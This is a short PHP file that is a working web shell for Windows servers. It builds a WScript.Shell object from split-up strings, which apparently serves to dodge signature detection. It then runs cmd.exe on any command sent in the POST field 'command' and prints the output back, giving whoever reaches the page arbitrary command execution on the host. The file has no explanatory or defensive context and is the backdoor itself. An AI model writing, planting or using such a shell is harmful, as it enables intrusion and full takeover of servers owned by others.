<?php
$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
echo "end";
?>